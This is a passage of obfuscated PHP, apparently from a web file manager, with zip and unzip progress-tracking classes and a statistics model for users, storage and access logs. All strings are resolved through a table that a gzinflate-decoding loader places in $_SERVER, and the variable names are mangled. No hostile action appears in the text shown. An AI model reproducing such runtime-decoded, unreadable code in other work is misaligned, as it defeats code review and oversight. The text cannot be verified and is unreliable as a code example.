($ğ·ËÁº = 1; $ğ·ËÁº <= count($¬éÌëô•) + 1; $ğ·ËÁº++) { $ËÛÅ¬¹ = substr($Æùî¤Ğ, 0, strlen($Æùî¤Ğ) - strlen($Èæ„—Öå)); $²œ´·²° = $ËÛÅ¬¹ . "\50{$ğ·ËÁº}\x29{$Èæ„—Öå}"; if (!in_array_not_case($²œ´·²°, $¬éÌëô•)) { return $²œ´·²°; } } } } goto e®İÇ¯‡µÁ; F¼ôÍÆİİå: define($_SERVER[‘ÆÜ‘œ][0], $_SERVER[‘ÆÜ‘œ][1]); $_SERVER[·ïÈëŒò] = explode($_SERVER[‘ÆÜ‘œ][2], gzinflate(substr($_SERVER[‘ÆÜ‘œ][3], 10, -8))); function binCheckEq($†ÛÆÈÌò, $šè©È) { return $†ÛÆÈÌò == $šè©È; } goto b¦ÌÅµÎ¬§; B–®œ‰ñğ‘: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $‡Ñ££È¡ =& $_SERVER[‘ÆÜ‘œ]; parent::startAfter(); Hook::bind($‡Ñ££È¡[2054], array($this, $‡Ñ££È¡[2055])); Hook::bind($‡Ñ££È¡[1332], array($this, $‡Ñ££È¡[2056])); Hook::bind($‡Ñ££È¡[2057], array($this, $‡Ñ££È¡[2058])); $öéö¶¬û =& $this->task; $öéö¶¬û[$‡Ñ££È¡[2059]] = $‡Ñ££È¡[1333]; if (!$öéö¶¬û[$‡Ñ££È¡[1818]]) { $öéö¶¬û[$‡Ñ££È¡[1818]] = LNG($‡Ñ££È¡[2060]); } } protected function endAfter() { $íÇÓö£… =& $_SERVER[‘ÆÜ‘œ]; parent::endAfter(); Hook::unbind($íÇÓö£…[2054], array($this, $íÇÓö£…[2055])); Hook::unbind($íÇÓö£…[1332], array($this, $íÇÓö£…[2056])); Hook::unbind($íÇÓö£…[2057], array($this, $íÇÓö£…[2058])); } public function updateAfter() { $Ü÷¾áß =& $_SERVER[‘ÆÜ‘œ]; $í¾«Š“¾ =& $this->task; if (!$í¾«Š“¾[$Ü÷¾áß[1180]] || !$í¾«Š“¾[$Ü÷¾áß[871]]) { if ($í¾«Š“¾[$Ü÷¾áß[2059]] != $Ü÷¾áß[398]) { return; } } if ($í¾«Š“¾[$Ü÷¾áß[2059]] == $Ü÷¾áß[1333]) { $ªŠ½‰¶Õ = 0; if ($í¾«Š“¾[$Ü÷¾áß[1983]]) { $ªŠ½‰¶Õ = $í¾«Š“¾[$Ü÷¾áß[1984]] / $í¾«Š“¾[$Ü÷¾áß[1983]]; } $í¾«Š“¾[$Ü÷¾áß[1931]] = $ªŠ½‰¶Õ * 0.3; } else { if ($í¾«Š“¾[$Ü÷¾áß[2059]] == $Ü÷¾áß[398]) { $ªŠ½‰¶Õ = $í¾«Š“¾[$Ü÷¾áß[1930]] / $í¾«Š“¾[$Ü÷¾áß[1180]]; $í¾«Š“¾[$Ü÷¾áß[1931]] = 0.3 + $ªŠ½‰¶Õ * 0.4; } else { if ($í¾«Š“¾[$Ü÷¾áß[2059]] == $Ü÷¾áß[108]) { $Ÿ—€üûÀ = 0; if ($í¾«Š“¾[$Ü÷¾áß[1985]] == $Ü÷¾áß[108]) { $Ÿ—€üûÀ = $í¾«Š“¾[$Ü÷¾áß[1984]]; } $ªŠ½‰¶Õ = ($í¾«Š“¾[$Ü÷¾áß[1988]] + $Ÿ—€üûÀ) / $í¾«Š“¾[$Ü÷¾áß[871]]; $í¾«Š“¾[$Ü÷¾áß[1931]] = 0.3 + 0.4 + $ªŠ½‰¶Õ * 0.3; } } } if ($í¾«Š“¾[$Ü÷¾áß[1931]] > 0) { $„úğäó = timeFloat() - $í¾«Š“¾[$Ü÷¾áß[1933]] - $í¾«Š“¾[$Ü÷¾áß[1936]]; $í¾«Š“¾[$Ü÷¾áß[1937]] = $„úğäó * (1 - $í¾«Š“¾[$Ü÷¾áß[1931]]) / $í¾«Š“¾[$Ü÷¾áß[1931]]; } } public function addFile($ïé’©ª) { $¼”êÔğ =& $_SERVER[‘ÆÜ‘œ]; $çæò›—Å =& $this->task; $Æ‡çƒ›Ò = IO::info($ïé’©ª); $çæò›—Å[$¼”êÔğ[1981]] = $Æ‡çƒ›Ò[$¼”êÔğ[32]]; $çæò›—Å[$¼”êÔğ[1983]] = $Æ‡çƒ›Ò[$¼”êÔğ[79]]; $çæò›—Å[$¼”êÔğ[1984]] = 0; $çæò›—Å[$¼”êÔğ[1182]] = $¼”êÔğ[2012]; $çæò›—Å[$¼”êÔğ[1985]] = $¼”êÔğ[1333]; $çæò›—Å[$¼”êÔğ[871]] = $Æ‡çƒ›Ò[$¼”êÔğ[79]]; $çæò›—Å[$¼”êÔğ[1180]] = 1; $›×êß = 0; $çæò›—Å[$¼”êÔğ[1994]] = array($¼”êÔğ[1995] => $›×êß + 1, $¼”êÔğ[517] => $Æ‡çƒ›Ò[$¼”êÔğ[32]], $¼”êÔğ[87] => $Æ‡çƒ›Ò[$¼”êÔğ[87]], $¼”êÔğ[610] => $Æ‡çƒ›Ò[$¼”êÔğ[610]] ? $Æ‡çƒ›Ò[$¼”êÔğ[610]] : $Æ‡çƒ›Ò[$¼”êÔğ[87]]); $this->update(); } public function zipEvent($íÔ°€ˆí, $­Ô»ÁşË, $Ø¹õéîå, $€Òâ½Šã) { $ï°øüª =& $_SERVER[‘ÆÜ‘œ]; $‡ ›°Œø =& $this->task; $‡ ›°Œø[$ï°øüª[1981]] = get_path_this($­Ô»ÁşË); $‡ ›°Œø[$ï°øüª[1983]] = $€Òâ½Šã; $‡ ›°Œø[$ï°øüª[1984]] = $Ø¹õéîå; $‡ ›°Œø[$ï°øüª[1182]] = $íÔ°€ˆí == $ï°øüª[2061] ? $ï°øüª[2062] : $ï°øüª[2063]; $‡ ›°Œø[$ï°øüª[1985]] = $ï°øüª[12]; $‡ ›°Œø[$ï°øüª[871]] = $€Òâ½Šã; $‡ ›°Œø[$ï°øüª[2059]] = $ï°øüª[398]; $this->update(); } public function unzipAfter($¨£ùö÷Î) { $”ò­ª§” =& $_SERVER[‘ÆÜ‘œ]; $›…ª¸©“ =& $this->task; $›…ª¸©“[$”ò­ª§”[2059]] = $”ò­ª§”[108]; $ó²ôµı¤ = IO::infoWithChildren($¨£ùö÷Î); $™¯º™ş = 0; $›…ª¸©“[$”ò­ª§”[1994]] = array($”ò­ª§”[1995] => $™¯º™ş + 1, $”ò­ª§”[517] => $ó²ôµı¤[$”ò­ª§”[32]], $”ò­ª§”[87] => $ó²ôµı¤[$”ò­ª§”[87]], $”ò­ª§”[610] => $ó²ôµı¤[$”ò­ª§”[610]] ? $ó²ôµı¤[$”ò­ª§”[610]] : $ó²ôµı¤[$”ò­ª§”[87]]); if ($ó²ôµı¤[$”ò­ª§”[33]] == $”ò­ª§”[231]) { $›…ª¸©“[$”ò­ª§”[1180]] = 1; } else { $›…ª¸©“[$”ò­ª§”[1180]] = $ó²ôµı¤[$”ò­ª§”[82]][$”ò­ª§”[80]]; } $›…ª¸©“[$”ò­ª§”[1182]] = $”ò­ª§”[12]; $›…ª¸©“[$”ò­ª§”[1985]] = 0; $›…ª¸©“[$”ò­ª§”[1930]] = 0; $›…ª¸©“[$”ò­ª§”[1983]] = 0; $›…ª¸©“[$”ò­ª§”[1984]] = 0; $›…ª¸©“[$”ò­ª§”[1981]] = $”ò­ª§”[12]; $›…ª¸©“[$”ò­ª§”[1988]] = 0; $›…ª¸©“[$”ò­ª§”[871]] = $ó²ôµı¤[$”ò­ª§”[79]]; $this->update(); self::log($”ò­ª§”[2064] . json_encode(array($›…ª¸©“, $ó²ôµı¤))); } public function nameParse($¤Â˜ÈØÅ) { $µ¡Ç‰ş =& $_SERVER[‘ÆÜ‘œ]; $âÑöü =& $this->task; if ($âÑöü[$µ¡Ç‰ş[2059]] == $µ¡Ç‰ş[1333]) { $âÑöü[$µ¡Ç‰ş[2059]] = $µ¡Ç‰ş[398]; $âÑöü[$µ¡Ç‰ş[1988]] = 0; $âÑöü[$µ¡Ç‰ş[871]] = 0; } $çı¥½ó = get_path_this($¤Â˜ÈØÅ); if (strstr($çı¥½ó, $µ¡Ç‰ş[10])) { $âÑöü[$µ¡Ç‰ş[1930]] += 1; $âÑöü[$µ¡Ç‰ş[1180]] += 1; } $âÑöü[$µ¡Ç‰ş[1981]] = $¤Â˜ÈØÅ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $éšŠÁ£ä =& $_SERVER[‘ÆÜ‘œ]; parent::startAfter(); Hook::bind($éšŠÁ£ä[2065], array($this, $éšŠÁ£ä[2055])); Hook::bind($éšŠÁ£ä[2057], array($this, $éšŠÁ£ä[2058])); $°şöÌ„ =& $this->task; $°şöÌ„[$éšŠÁ£ä[2059]] = $éšŠÁ£ä[1333]; if (!$°şöÌ„[$éšŠÁ£ä[1818]]) { $°şöÌ„[$éšŠÁ£ä[1818]] = LNG($éšŠÁ£ä[2066]); } } protected function endAfter() { $‰€’¡‡¶ =& $_SERVER[‘ÆÜ‘œ]; parent::endAfter(); Hook::unbind($‰€’¡‡¶[2065], array($this, $‰€’¡‡¶[2055])); Hook::unbind($‰€’¡‡¶[2057], array($this, $‰€’¡‡¶[2058])); } public function updateAfter() { $ƒÀƒ˜Ã =& $_SERVER[‘ÆÜ‘œ]; $À“ŒŒ´ =& $this->task; if (!$À“ŒŒ´[$ƒÀƒ˜Ã[1180]] || !$À“ŒŒ´[$ƒÀƒ˜Ã[871]]) { return; } if ($À“ŒŒ´[$ƒÀƒ˜Ã[2059]] == $ƒÀƒ˜Ã[1333]) { $áĞàã÷’ = $À“ŒŒ´[$ƒÀƒ˜Ã[1984]]; if ($À“ŒŒ´[$ƒÀƒ˜Ã[1985]] != $ƒÀƒ˜Ã[1333]) { $áĞàã÷’ = 0; } $ÀöÓ¦Ú¡ = ($À“ŒŒ´[$ƒÀƒ˜Ã[1988]] + $áĞàã÷’) / $À“ŒŒ´[$ƒÀƒ˜Ã[871]]; $À“ŒŒ´[$ƒÀƒ˜Ã[1931]] = $ÀöÓ¦Ú¡ * 0.3; } else { if ($À“ŒŒ´[$ƒÀƒ˜Ã[2059]] == $ƒÀƒ˜Ã[398]) { $ÀöÓ¦Ú¡ = $À“ŒŒ´[$ƒÀƒ˜Ã[1930]] / $À“ŒŒ´[$ƒÀƒ˜Ã[1180]]; $À“ŒŒ´[$ƒÀƒ˜Ã[1931]] = 0.3 + $ÀöÓ¦Ú¡ * 0.5; } else { if ($À“ŒŒ´[$ƒÀƒ˜Ã[2059]] == $ƒÀƒ˜Ã[108]) { $ÀöÓ¦Ú¡ = 0; if ($À“ŒŒ´[$ƒÀƒ˜Ã[1983]]) { $ÀöÓ¦Ú¡ = $À“ŒŒ´[$ƒÀƒ˜Ã[1984]] / $À“ŒŒ´[$ƒÀƒ˜Ã[1983]]; } $À“ŒŒ´[$ƒÀƒ˜Ã[1931]] = 0.3 + 0.5 + $ÀöÓ¦Ú¡ * 0.2; } } } if ($À“ŒŒ´[$ƒÀƒ˜Ã[1931]] > 0) { $˜ü·ùˆì = timeFloat() - $À“ŒŒ´[$ƒÀƒ˜Ã[1933]] - $À“ŒŒ´[$ƒÀƒ˜Ã[1936]]; $À“ŒŒ´[$ƒÀƒ˜Ã[1937]] = $˜ü·ùˆì * (1 - $À“ŒŒ´[$ƒÀƒ˜Ã[1931]]) / $À“ŒŒ´[$ƒÀƒ˜Ã[1931]]; } } public function copyFileStart($²˜ÜúÇÎ, $ÊëÈÓæÖ, $ğ“§˜¯¢, $—Ø®ª’, $¯ÚãÒÓà, $Æñ¯ş‚Ä) { $è¦Ö˜î… =& $_SERVER[‘ÆÜ‘œ]; parent::copyFileStart($²˜ÜúÇÎ, $ÊëÈÓæÖ, $ğ“§˜¯¢, $—Ø®ª’, $¯ÚãÒÓà, $Æñ¯ş‚Ä); $™¸»ÃŞè =& $this->task; if ($™¸»ÃŞè[$è¦Ö˜î…[2059]] == $è¦Ö˜î…[398]) { $™¸»ÃŞè[$è¦Ö˜î…[2059]] = $è¦Ö˜î…[108]; } $this->update(); } public function copyFileEnd($˜™­Ôà, $ÔÁ¤¯ú•, $Æ•Ìó‘¹, $ƒ÷Ü‹Ì, $îÄØâÊ, $û¬®¥¼) { $öò¯ö´­ =& $_SERVER[‘ÆÜ‘œ]; $éÔœÍ­± =& $this->task; $éÔœÍ­±[$öò¯ö´­[1984]] = $éÔœÍ­±[$öò¯ö´­[1983]]; $éÔœÍ­±[$öò¯ö´­[1988]] += $éÔœÍ­±[$öò¯ö´­[1983]]; $éÔœÍ­±[$öò¯ö´­[1985]] = $öò¯ö´­[12]; $this->update(); } public function zipEvent($ãø’À¾, $ä…Œ°Ó, $œ’ÁÚºú, $“¿ğ›Ú‹) { $€´ŒìÓÀ =& $_SERVER[‘ÆÜ‘œ]; $­å‰ƒ« =& $this->task; $­å‰ƒ«[$€´ŒìÓÀ[1981]] = get_path_this($ä…Œ°Ó); $­å‰ƒ«[$€´ŒìÓÀ[1983]] = $“¿ğ›Ú‹; $­å‰ƒ«[$€´ŒìÓÀ[1984]] = $œ’ÁÚºú; $­å‰ƒ«[$€´ŒìÓÀ[1182]] = $ãø’À¾ == $€´ŒìÓÀ[2067] ? $€´ŒìÓÀ[2062] : $€´ŒìÓÀ[2063]; $­å‰ƒ«[$€´ŒìÓÀ[1985]] = $€´ŒìÓÀ[12]; $­å‰ƒ«[$€´ŒìÓÀ[871]] = $“¿ğ›Ú‹; $­å‰ƒ«[$€´ŒìÓÀ[2059]] = $€´ŒìÓÀ[398]; $this->update(); } public function nameParse($åòçÅâ) { $Á¥ßí›Õ =& $_SERVER[‘ÆÜ‘œ]; $Ì‚ö¡” =& $this->task; if ($Ì‚ö¡”[$Á¥ßí›Õ[1930]] < $Ì‚ö¡”[$Á¥ßí›Õ[1180]]) { $ãó‹””ô = get_path_this($åòçÅâ); if (strstr($ãó‹””ô, $Á¥ßí›Õ[10])) { $Ì‚ö¡”[$Á¥ßí›Õ[1930]] += 1; } } if ($Ì‚ö¡”[$Á¥ßí›Õ[2059]] == $Á¥ßí›Õ[1333]) { $Ì‚ö¡”[$Á¥ßí›Õ[2059]] = $Á¥ßí›Õ[398]; } $Ì‚ö¡”[$Á¥ßí›Õ[1981]] = $åòçÅâ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($¼äçÏõ) { $Ğ–×ÉÜá =& $_SERVER[‘ÆÜ‘œ]; $í·»Ë€ú = array($Ğ–×ÉÜá[692] => array($Ğ–×ÉÜá[33] => $Ğ–×ÉÜá[2068], $Ğ–×ÉÜá[361] => array($Ğ–×ÉÜá[283], $Ğ–×ÉÜá[873], $Ğ–×ÉÜá[2069], $Ğ–×ÉÜá[2070])), $Ğ–×ÉÜá[2071] => array($Ğ–×ÉÜá[33] => $Ğ–×ÉÜá[2072], $Ğ–×ÉÜá[361] => array($Ğ–×ÉÜá[283], $Ğ–×ÉÜá[871], $Ğ–×ÉÜá[2073], $Ğ–×ÉÜá[2074], $Ğ–×ÉÜá[2075]))); if (!isset($í·»Ë€ú[$¼äçÏõ])) { return !1; } $this->optionType = $í·»Ë€ú[$¼äçÏõ][$Ğ–×ÉÜá[33]]; $this->field = $í·»Ë€ú[$¼äçÏõ][$Ğ–×ÉÜá[361]]; return !0; } public function listData($‹Õˆ¼Ö€ = false, $·¥ı = "\x6d\x6f\x64\x69\146\171\124\151\155\x65", $–™şˆ† = false) { return parent::listData($‹Õˆ¼Ö€, $·¥ı, $–™şˆ†); } public function trendList($‰ä”¸öÅ) { $Û¶Ìïöç =& $_SERVER[‘ÆÜ‘œ]; $Ì€Êª„ä = $this->listData(); if ($Ì€Êª„ä) { $«î°ÇÑ€ = end($Ì€Êª„ä); $Ö€ı¦ıå = date($Û¶Ìïöç[2076], strtotime($Û¶Ìïöç[2077])); if ($«î°ÇÑ€[$Û¶Ìïöç[283]] == $Ö€ı¦ıå) { return $Ì€Êª„ä; } $äÔåáº¦ = strtotime($«î°ÇÑ€[$Û¶Ìïöç[283]]); } if (!isset($äÔåáº¦)) { $êæ½âš¬ = $‰ä”¸öÅ == $Û¶Ìïöç[692] ? $Û¶Ìïöç[625] : $Û¶Ìïöç[939]; $äÔåáº¦ = Model($êæ½âš¬)->min($Û¶Ìïöç[232]); } $œëĞçË = $Û¶Ìïöç[2078] . ucfirst($‰ä”¸öÅ); $•ìÛ¯ = $this->dateList($äÔåáº¦); foreach ($•ìÛ¯ as $Ö€ı¦ıå) { $this->{$œëĞçË}($Ö€ı¦ıå); } return $this->listData(); } private function dateList($‘Ú®…ŒÛ) { $úÔº²•Ş =& $_SERVER[‘ÆÜ‘œ]; $…ÙâÌÖš = $‘Ú®…ŒÛ; $‡ó¯Úé² = strtotime($úÔº²•Ş[2077]); $ƒñ”¤ô¯ = array(); while ($…ÙâÌÖš <= $‡ó¯Úé²) { $ƒñ”¤ô¯[] = date($úÔº²•Ş[2076], $…ÙâÌÖš); $…ÙâÌÖš = strtotime($úÔº²•Ş[2079], $…ÙâÌÖš); } return $ƒñ”¤ô¯; } public function _recordUser($¿á‡ê¢à = '') { $â®ø—ß =& $_SERVER[‘ÆÜ‘œ]; $½îÊ‹õ = strtotime(date($â®ø—ß[2080], strtotime($¿á‡ê¢à))); $Åµ¬ÅÍÚ = strtotime(date($â®ø—ß[2081], strtotime($¿á‡ê¢à))); $¹¸¯äŸÌ = array($â®ø—ß[232] => array($â®ø—ß[1131], $Åµ¬ÅÍÚ)); $åàØ¸Ä™ = Model($â®ø—ß[625])->where($¹¸¯äŸÌ)->count($â®ø—ß[1544]); $¹¸¯äŸÌ[$â®ø—ß[232]] = array($â®ø—ß[418], array($½îÊ‹õ, $Åµ¬ÅÍÚ)); $èáÙØ„ó = Model($â®ø—ß[625])->where($¹¸¯äŸÌ)->count($â®ø—ß[1544]); $¹¸¯äŸÌ[$â®ø—ß[33]] = $â®ø—ß[2082]; $Ÿ÷şª¡ = Model($â®ø—ß[2083])->where($¹¸¯äŸÌ)->count($â®ø—ß[2084]); $³¬æäÙÅ = array($â®ø—ß[283] => $¿á‡ê¢à, $â®ø—ß[873] => (int) $åàØ¸Ä™, $â®ø—ß[2069] => (int) $èáÙØ„ó, $â®ø—ß[2070] => (int) $Ÿ÷şª¡); return $this->insert($³¬æäÙÅ); } public function _recordStore($Î²ÅÄë = '') { $ó®ïŠÖ =& $_SERVER[‘ÆÜ‘œ]; $–ğí›Çş = strtotime(date($ó®ïŠÖ[2081], strtotime($Î²ÅÄë))); $·„Êòˆ‰ = array($ó®ïŠÖ[232] => array($ó®ïŠÖ[1131], $–ğí›Çş)); $Ïù¸„ó = Model($ó®ïŠÖ[568])->where($·„Êòˆ‰)->sum($ó®ïŠÖ[79]); $·„Êòˆ‰[$ó®ïŠÖ[508]] = 0; $”õ¥Ş” = Model($ó®ïŠÖ[939])->where($·„Êòˆ‰)->sum($ó®ïŠÖ[79]); $·„Êòˆ‰[$ó®ïŠÖ[189]] = 1; $Ê‹Õ®õ¢ = Model($ó®ïŠÖ[939])->where($·„Êòˆ‰)->sum($ó®ïŠÖ[79]); $·„Êòˆ‰[$ó®ïŠÖ[189]] = 2; $ÁÂ¼¼Ğí = Model($ó®ïŠÖ[939])->where($·„Êòˆ‰)->sum($ó®ïŠÖ[79]); $·ã¢Ñ®É = array($ó®ïŠÖ[283] => $Î²ÅÄë, $ó®ïŠÖ[871] => (int) $”õ¥Ş”, $ó®ïŠÖ[2073] => (int) $Ïù¸„ó, $ó®ïŠÖ[2074] => (int) $Ê‹Õ®õ¢, $ó®ïŠÖ[2075] => (int) $ÁÂ¼¼Ğí); return $this->insert($·ã¢Ñ®É); } public function trend($ÈŒòèî, $÷Šö€Í) { $½ “®«Ü =& $_SERVER[‘ÆÜ‘œ]; if (!$this->init($ÈŒòèî)) { return !1; } $øôÂ‘ç† = $this->trendList($ÈŒòèî); if ($øôÂ‘ç† && $÷Šö€Í != $½ “®«Ü[1903]) { $â‘“«ƒ× = $øôÂ‘ç†[0][$½ “®«Ü[283]]; $ÚÕ™„Ğ = $this->validDate($÷Šö€Í, $â‘“«ƒ×); $â«Î’æ = array(); $·ÚîšÌ = array_to_keyvalue($øôÂ‘ç†, $½ “®«Ü[283]); foreach ($ÚÕ™„Ğ as $£Úø¿ïÇ) { if (isset($·ÚîšÌ[$£Úø¿ïÇ])) { $“É¨•ÛĞ = $·ÚîšÌ[$£Úø¿ïÇ]; } else { $“É¨•ÛĞ = end($øôÂ‘ç†); $“É¨•ÛĞ[$½ “®«Ü[283]] = $£Úø¿ïÇ; if ($ÈŒòèî == $½ “®«Ü[692]) { $“É¨•ÛĞ[$½ “®«Ü[2069]] = $“É¨•ÛĞ[$½ “®«Ü[2070]] = 0; } } $â«Î’æ[] = $“É¨•ÛĞ; } $øôÂ‘ç† = $â«Î’æ; } $‹…ß¦Õæ = array($½ “®«Ü[692] => array($½ “®«Ü[873] => LNG($½ “®«Ü[2085]), $½ “®«Ü[2069] => LNG($½ “®«Ü[2086]), $½ “®«Ü[2070] => LNG($½ “®«Ü[2087])), $½ “®«Ü[2071] => array($½ “®«Ü[871] => LNG($½ “®«Ü[2088]), $½ “®«Ü[2073] => LNG($½ “®«Ü[2089]), $½ “®«Ü[2074] => LNG($½ “®«Ü[2090]), $½ “®«Ü[2075] => LNG($½ “®«Ü[2091]))); $æıä¤Àã = array($½ “®«Ü[692] => $½ “®«Ü[2092], $½ “®«Ü[2071] => $½ “®«Ü[79]); if (empty($øôÂ‘ç†)) { $£Úø¿ïÇ = date($½ “®«Ü[2076], strtotime($½ “®«Ü[2077])); $åë›ŞõÂ = array($½ “®«Ü[283] => $£Úø¿ïÇ); foreach ($‹…ß¦Õæ[$ÈŒòèî] as $Âã“òï¸ => $€ÄıöÉŞ) { $åë›ŞõÂ[$Âã“òï¸] = 0; } $øôÂ‘ç†[] = $åë›ŞõÂ; } $ÆúÇ°ÜÑ = array(); foreach ($øôÂ‘ç† as $€ÄıöÉŞ) { if ($ÈŒòèî == $½ “®«Ü[2071] && $€ÄıöÉŞ[$½ “®«Ü[2073]] > $€ÄıöÉŞ[$½ “®«Ü[871]]) { $€ÄıöÉŞ[$½ “®«Ü[2073]] = $€ÄıöÉŞ[$½ “®«Ü[871]]; } foreach ($‹…ß¦Õæ[$ÈŒòèî] as $Âã“òï¸ => $ö¹ú–ß•) { $“É¨•ÛĞ = array($½ “®«Ü[283] => $€ÄıöÉŞ[$½ “®«Ü[283]], $½ “®«Ü[1818] => $ö¹ú–ß•); $“É¨•ÛĞ[$æıä¤Àã[$ÈŒòèî]] = isset($€ÄıöÉŞ[$Âã“òï¸]) ? $€ÄıöÉŞ[$Âã“òï¸] : 0; $ÆúÇ°ÜÑ[] = $“É¨•ÛĞ; } } return $ÆúÇ°ÜÑ; } public function validDate($ğºŸşãÎ, $®Şş¸ˆÍ) { $ò“üÊ¦¸ =& $_SERVER[‘ÆÜ‘œ]; $•šŒÈÜ§ = date($ò“üÊ¦¸[2076], strtotime($ò“üÊ¦¸[2077])); $Ğ¨å‡‡ = array($•šŒÈÜ§); switch ($ğºŸşãÎ) { case $ò“üÊ¦¸[1910]: $ÏÔæŸŠæ = mktime(0, 0, 0, date($ò“üÊ¦¸[2093]), date($ò“üÊ¦¸[1610]) - date($ò“üÊ¦¸[1696]) + 7 - 7, date($ò“üÊ¦¸[2094])); $øÍÑØ‹¶ = 0; do { $Ã¡Ç·Åê = date($ò“üÊ¦¸[2076], $ÏÔæŸŠæ - 3600 * 24 * 7 * $øÍÑØ‹¶); $Ğ¨å‡‡[] = $Ã¡Ç·Åê; $øÍÑØ‹¶++; } while ($®Şş¸ˆÍ < $Ã¡Ç·Åê); break; case $ò“üÊ¦¸[1908]: $øÍÑØ‹¶ = 1; do { $ÓŸª§óÍ = date($ò“üÊ¦¸[2095], strtotime("\55\x20{$øÍÑØ‹¶}\40\155\157\156\x74\x68\x73")); $Ğ¨å‡‡[] = $ÓŸª§óÍ; $øÍÑØ‹¶++; } while ($®Şş¸ˆÍ < $ÓŸª§óÍ); break; case $ò“üÊ¦¸[2096]: $¿¥¡Ëò = (int) date($ò“üÊ¦¸[2094], strtotime($®Şş¸ˆÍ)); $‹³ÙÉµ÷ = (int) date($ò“üÊ¦¸[2094]); if ($¿¥¡Ëò >= $‹³ÙÉµ÷) { break; } for ($¿¥¡Ëò; $¿¥¡Ëò < $‹³ÙÉµ÷; $¿¥¡Ëò++) { $Ğ¨å‡‡[] = $¿¥¡Ëò . $ò“üÊ¦¸[2097]; } break; default: break; } if ($®Şş¸ˆÍ > end($Ğ¨å‡‡)) { array_pop($Ğ¨å‡‡); } sort($Ğ¨å‡‡); return $Ğ¨å‡‡; } public function listTable($ù¡©§’) { $Äè¡ÊŞ” = ucfirst($ù¡©§’); return Model($Äè¡ÊŞ”)->listData(); } public function option($²ãÉ‘ƒ¾) { return call_user_func_array(array($this, $_SERVER[‘ÆÜ‘œ][2098] . ucfirst($²ãÉ‘ƒ¾)), array()); } private function optionUser() { $Ğé»õşÛ =& $_SERVER[‘ÆÜ‘œ]; $ÜÚÀÈÆô = Model($Ğé»õşÛ[625])->count($Ğé»õşÛ[1544]); $ãëğ‡Ÿ = Model($Ğé»õşÛ[625])->where($Ğé»õşÛ[2099])->count($Ğé»õşÛ[1544]); $ÚÄœ˜û² = intval($GLOBALS[$Ğé»õşÛ[6]][$Ğé»õşÛ[434]][$Ğé»õşÛ[1876]]) / 3600; $Üã‹Î = strtotime("\x2d{$ÚÄœ˜û²}\40\x68\x6f\165\x72\163"); $‰½ÇÔÜ = strtotime(date($Ğé»õşÛ[2080])); if ($Üã‹Î < $‰½ÇÔÜ) { $Üã‹Î = $‰½ÇÔÜ; } $ûğüÂ‰¢ = array($Ğé»õşÛ[2100] => array($Ğé»õşÛ[1132], $Üã‹Î)); $«±¥’Ä = (int) Model($Ğé»õşÛ[625])->where($ûğüÂ‰¢)->count($Ğé»õşÛ[1544]); if (!$«±¥’Ä) { $«±¥’Ä = 1; } $ûğüÂ‰¢ = array($Ğé»õşÛ[2100] => array($Ğé»õşÛ[1132], $‰½ÇÔÜ)); $È¤çÕ´½ = Model($Ğé»õşÛ[625])->where($ûğüÂ‰¢)->count($Ğé»õşÛ[1544]); return array($Ğé»õşÛ[866] => (int) $ÜÚÀÈÆô, $Ğé»õşÛ[2101] => (int) ($ÜÚÀÈÆô - $ãëğ‡Ÿ), $Ğé»õşÛ[2102] => (int) $ãëğ‡Ÿ, $Ğé»õşÛ[2103] => (int) $È¤çÕ´½, $Ğé»õşÛ[2104] => $«±¥’Ä); } private function optionFile() { $ü™­‚Õ€ =& $_SERVER[‘ÆÜ‘œ]; $ŞÈùÚ¿ = $this->sourceSize(); $Óºœüš = $ŞÈùÚ¿[$ü™­‚Õ€[79]]; $‡½ÉÑµ = $ŞÈùÚ¿[$ü™­‚Õ€[2073]]; $€öŸ¿ÄÏ = Model($ü™­‚Õ€[939])->where(array($ü™­‚Õ€[508] => 0))->count($ü™­‚Õ€[192]); $ğßÓÑ’ş = array($ü™­‚Õ€[508] => 0, $ü™­‚Õ€[232] => array($ü™­‚Õ€[1132], strtotime(date($ü™­‚Õ€[2080])))); $Ñ¥ù«Ôö = Model($ü™­‚Õ€[939])->where($ğßÓÑ’ş)->sum($ü™­‚Õ€[79]); $ëòÓÔ¯ = Model($ü™­‚Õ€[939])->where($ğßÓÑ’ş)->count($ü™­‚Õ€[192]); return array($ü™­‚Õ€[871] => $Óºœüš, $ü™­‚Õ€[2073] => $‡½ÉÑµ, $ü™­‚Õ€[2105] => $Óºœüš - $‡½ÉÑµ, $ü™­‚Õ€[2106] => (int) $Ñ¥ù«Ôö, $ü™­‚Õ€[873] => (int) $€öŸ¿ÄÏ, $ü™­‚Õ€[2107] => (int) $ëòÓÔ¯); } private function optionAccess() { $Ï»¥Üù =& $_SERVER[‘ÆÜ‘œ]; return array($Ï»¥Üù[866] => $this->typeLogCnt(), $Ï»¥Üù[108] => $this->typeLogCnt($Ï»¥Üù[108]), $Ï»¥Üù[547] => $this->typeLogCnt($Ï»¥Üù[547]), $Ï»¥Üù[1282] => $this->typeLogCnt($Ï»¥Üù[1282]), $Ï»¥Üù[1513] => $this->typeLogCnt($Ï»¥Üù[1513]), $Ï»¥Üù[692] => $this->typeLogCnt($Ï»¥Üù[12], $Ï»¥Üù[2084])); } private function typeLogCnt($±ëùÖƒò = '', $Œ“ã = "\x69\x64") { $ğŞÜ©Ùí =& $_SERVER[‘ÆÜ‘œ]; $Ô¾»Å = array($ğŞÜ©Ùí[108] => array($ğŞÜ©Ùí[2108], $ğŞÜ©Ùí[2109]), $ğŞÜ©Ùí[547] => array($ğŞÜ©Ùí[2110], $ğŞÜ©Ùí[2111]), $ğŞÜ©Ùí[1282] => array($ğŞÜ©Ùí[2112], $ğŞÜ©Ùí[2113], $ğŞÜ©Ùí[2114]), $ğŞÜ©Ùí[1513] => array($ğŞÜ©Ùí[2115], $ğŞÜ©Ùí[2116]), $ğŞÜ©Ùí[1514] => array($ğŞÜ©Ùí[2117], $ğŞÜ©Ùí[2118], $ğŞÜ©Ùí[2119])); $¯÷€›¸ƒ = strtotime(date($ğŞÜ©Ùí[2080])); $÷ ºÅŒÅ = array($ğŞÜ©Ùí[232] => array($ğŞÜ©Ùí[1132], $¯÷€›¸ƒ)); if ($±ëùÖƒò) { $÷ ºÅŒÅ[$ğŞÜ©Ùí[33]] = array($ğŞÜ©Ùí[7], $Ô¾»Å[$±ëùÖƒò]); } $‘‚öéÙï = Model($ğŞÜ©Ùí[2083])->where($÷ ºÅŒÅ)->count($Œ“ã); return (int) $‘‚öéÙï; } private function optionServer() { $Ş’¸Ûò† =& $_SERVER[‘ÆÜ‘œ]; $úíÍ¹ = 